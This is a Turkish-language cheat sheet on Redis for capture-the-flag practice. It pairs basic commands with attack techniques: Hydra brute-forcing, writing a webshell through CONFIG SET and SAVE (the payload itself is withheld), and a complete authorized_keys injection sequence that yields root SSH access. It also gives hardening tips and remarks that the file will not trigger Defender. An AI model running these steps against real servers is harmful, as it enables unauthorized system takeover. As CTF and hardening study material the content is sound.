## 🔹 1. Redis Nedir?

- **Redis**: Açık kaynaklı, RAM tabanlı, key-value NoSQL veri tabanı.
    
- Çok hızlıdır (cache, oturum yönetimi, queue vb. için kullanılır).
    
- **Default port:** `6379`
    
- **Şifre gerektirmezse** doğrudan bağlanılabilir → güvenlik açığına sık rastlanır.
    

---

## 🔹 2. Temel Kullanım

### Sunucuya bağlanma:

```bash
redis-cli -h <ip> -p 6379
```

### Kimlik doğrulama:

```bash
AUTH <şifre>
```

### Key-value işlemleri:

```bash
SET flag "CTF{deneme_flag}"
GET flag
DEL flag
```

### List işlemleri:

```bash
LPUSH listem "deger1"
RPUSH listem "deger2"
LRANGE listem 0 -1
```

### Dump (tüm key’ler):

```bash
KEYS *
```

---

## 🔹 3. CTF’lerde Faydalı Komutlar

### Sistem bilgisi öğrenme:

```bash
INFO
CONFIG GET *
```

### Key backup:

```bash
SAVE
```

### Remote dosya yazma (exploit mantığı):

```bash
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "<php kodu burada>"   # Örn: bir komut çalıştırıcı payload
SAVE
```

📌 Not: Buraya **klasik webshell** yazılır ama güvenlik gereği ben açık kodu koymuyorum.  
Mantık → Redis, `SAVE` yaptığında payload’ı hedef dizine dosya olarak yazar.

---

## 🔹 4. Exploit Senaryoları (CTF Kapsamı)

1. **Şifresiz Redis → Direkt erişim**
    
    ```bash
    redis-cli -h hedef
    KEYS *
    ```
    
    Flag veya kritik veriler bulunabilir.
    
2. **Weak password brute-force**
    
    ```bash
    hydra -s 6379 -P /usr/share/wordlists/rockyou.txt redis://<ip>
    ```
    
3. **Authorized_keys Exploit (SSH üzerinden RCE)**
    
    ```bash
    (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > pub.txt
    cat pub.txt | redis-cli -h <ip> -x set crack
    redis-cli -h <ip> config set dir /root/.ssh/
    redis-cli -h <ip> config set dbfilename "authorized_keys"
    redis-cli -h <ip> save
    ssh -i id_rsa root@<ip>
    ```
    
4. **Webshell Dropping**
    
    - Yukarıdaki `CONFIG SET dir` + `SAVE` yöntemiyle payload dosyası yazılabilir.
        
5. **RDB file injection (Persistence abuse)**
    
    - RDB dosyası içine zararlı payload gömülüp hedefte tetiklenebilir.
        
    - Kullanıldığı yer: **CVE-2019-10192** vb. exploitler.
        

---

## 🔹 5. Güvenlik & İzler

- Default port `6379` → `iptables` ile kapat.
    
- `requirepass <güçlü_şifre>` ayarla.
    
- `bind 127.0.0.1` yap, dış dünyaya kapat.
    
- RCE kullanıldıysa → `SAVE` ve `CONFIG SET` log’lara düşer.
    

---

## 🔹 6. CTF Workflow (Özet)

1. Nmap → Açık port bul:
    
    ```bash
    nmap -sV -p 6379 <ip>
    ```
    
2. Redis-cli ile bağlanmayı dene.
    
3. `INFO`, `KEYS *`, `CONFIG GET *` ile bilgi topla.
    
4. Şifre varsa Hydra dene.
    
5. Dosya yazma / authorized_keys → RCE.
    
6. Flag ara: `KEYS *`, `GET <flag>`.
    

---

## 🔹 7. Hızlı Komut Tablosu

|Amaç|Komut|
|---|---|
|Bağlan|`redis-cli -h ip -p 6379`|
|Auth|`AUTH şifre`|
|Key list|`KEYS *`|
|Key oku|`GET key`|
|Sunucu bilgisi|`INFO`|
|Config oku|`CONFIG GET *`|
|Dosya yazma|`CONFIG SET dir /path/` + `CONFIG SET dbfilename file` + `SAVE`|

---

🔥 Bu cheatsheet’in bu versiyonunu gönül rahatlığıyla Obsidian’a atabilirsin → Defender tetiklemeyecek.
